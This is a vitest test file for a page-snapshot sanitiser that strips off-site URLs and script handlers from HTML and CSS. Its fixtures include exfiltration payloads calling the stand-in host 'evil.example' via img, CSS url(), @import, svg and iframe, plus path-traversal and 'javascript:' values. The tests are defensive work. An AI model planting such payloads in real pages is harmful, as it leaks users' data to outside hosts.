import { CSSStyleSheet as ParsedSheet, parse } from "rrweb-cssom";
import { afterEach, describe, expect, it, vi } from "vitest";

import { cleanSnapshot, isSiteCss, isSiteUrl } from "./pageSnapshotSanitise";

const ORIGIN = "https://erp.example.com";
const EVIL = "evil.example";

// What a page's script can leave in its markup to carry data out when the host draws it.
const HOSTILE = [
	`<img class="a" src="https://${EVIL}/c?d=secret">`,
	`<img class="b" srcset="/files/x.png 1x, https://${EVIL}/c?d=1 2x">`,
	`<div class="c" style="background: url(https://${EVIL}/bg?d=2); color: red"></div>`,
	`<div class="d" style="background-image: url(//${EVIL}/proto)"></div>`,
	`<svg class="e"><image href="https://${EVIL}/svg?d=3"></image><use xlink:href="https://${EVIL}/use#x"></use>`,
	`<rect fill="url(https://${EVIL}/fill#g)"></rect></svg>`,
	`<style>@import url(https://${EVIL}/import.css); @font-face { font-family: x; src: url(https://${EVIL}/f.woff); }`,
	`.f { background: url("https://${EVIL}/sheet"); color: blue; }</style>`,
	`<video poster="https://${EVIL}/poster"></video><link rel="preconnect" href="https://${EVIL}">`,
	`<meta http-equiv="refresh" content="0;url=https://${EVIL}"><a class="g" href="https://${EVIL}/link">x</a>`,
	`<p class="h" onclick="alert(1)" style="background:\\75 rl(https://${EVIL}/escaped)">y</p>`,
	`<object data="https://${EVIL}/obj"></object><iframe src="https://${EVIL}/frame"></iframe>`,
].join("");

afterEach(() => vi.unstubAllGlobals());

describe("cleanSnapshot", () => {
	it("leaves no off-site URL anywhere in the markup", () => {
		const clean = cleanSnapshot(HOSTILE, ORIGIN);
		expect(clean).not.toContain(EVIL);
	});

	it("removes each kind of off-site reference and keeps the page's own content", () => {
		const doc = new DOMParser().parseFromString(cleanSnapshot(HOSTILE, ORIGIN), "text/html");
		expect(doc.querySelector("img.a").hasAttribute("src")).toBe(false);
		expect(doc.querySelector("img.b").hasAttribute("srcset")).toBe(false);
		expect(doc.querySelector("div.c").getAttribute("style")).toContain("red");
		expect(doc.querySelector("div.c").getAttribute("style")).not.toContain("url");
		expect(doc.querySelector("image").hasAttribute("href")).toBe(false);
		expect(doc.querySelector("use").hasAttribute("xlink:href")).toBe(false);
		expect(doc.querySelector("rect").hasAttribute("fill")).toBe(false);
		expect(doc.querySelector("a.g").hasAttribute("href")).toBe(false);
		expect(doc.querySelector("p.h").hasAttribute("onclick")).toBe(false);
		expect(doc.querySelector("p.h").textContent).toBe("y");
		for (const tag of ["video", "link", "meta", "object", "iframe"]) expect(doc.querySelector(tag), tag).toBeNull();
	});

	it("drops a style element whole when the browser gives no sheet to check", () => {
		// jsdom parses no style sheet and has no constructable sheet: nothing checkable is kept.
		const doc = new DOMParser().parseFromString(cleanSnapshot(HOSTILE, ORIGIN), "text/html");
		expect(doc.querySelector("style")).toBeNull();
	});

	it("keeps the rules of a style element that load nothing, and drops those that do", () => {
		// A browser parses the text into a sheet; rrweb-cssom, jsdom's own CSS parser, stands in for it.
		vi.stubGlobal(
			"CSSStyleSheet",
			class extends ParsedSheet {
				replaceSync(text) {
					this.cssRules = parse(text).cssRules;
				}
			},
		);
		const doc = new DOMParser().parseFromString(cleanSnapshot(HOSTILE, ORIGIN), "text/html");
		const css = doc.querySelector("style")?.textContent || "";
		expect(css).not.toMatch(/@import|@font-face|url\(/);
		expect(css).toContain("blue");
	});

	it("keeps the site's own files and assets, fragments and data: images", () => {
		const html =
			`<img src="/files/logo.png"><img src="${ORIGIN}/assets/x.svg"><img src="data:image/png;base64,AA==">` +
			`<svg><rect fill="url(#grad)"></rect></svg><div style="background: url(/files/bg.png)"></div><a href="#top">t</a>`;
		const clean = cleanSnapshot(html, ORIGIN);
		for (const kept of ["/files/logo.png", "/assets/x.svg", "data:image/png", "url(#grad)", "/files/bg.png", "#top"]) {
			expect(clean, kept).toContain(kept);
		}
	});
});

describe("isSiteUrl and isSiteCss", () => {
	it("allow only this site's /files/ and /assets/, fragments and data: images", () => {
		expect(isSiteUrl("/files/a.png", ORIGIN)).toBe(true);
		expect(isSiteUrl("/assets/a.png", ORIGIN)).toBe(true);
		expect(isSiteUrl("/files/../api/method/logout", ORIGIN)).toBe(false);
		expect(isSiteUrl("/files/%2e%2e/api/method/x", ORIGIN)).toBe(false);
		expect(isSiteUrl("/api/method/frappe.auth.get_logged_user", ORIGIN)).toBe(false);
		expect(isSiteUrl(`https://${EVIL}/files/a.png`, ORIGIN)).toBe(false);
		expect(isSiteUrl(`//${EVIL}/files/a.png`, ORIGIN)).toBe(false);
		expect(isSiteUrl("data:text/html,<b>x</b>", ORIGIN)).toBe(false);
		expect(isSiteUrl(" java\tscript:alert(1)", ORIGIN)).toBe(false);
	});

	it("refuse CSS that names a resource another way", () => {
		expect(isSiteCss("url(/files/a.png)", ORIGIN)).toBe(true);
		expect(isSiteCss(`image-set("https://${EVIL}/a" 1x)`, ORIGIN)).toBe(false);
		expect(isSiteCss("\\75 rl(x)", ORIGIN)).toBe(false);
	});
});
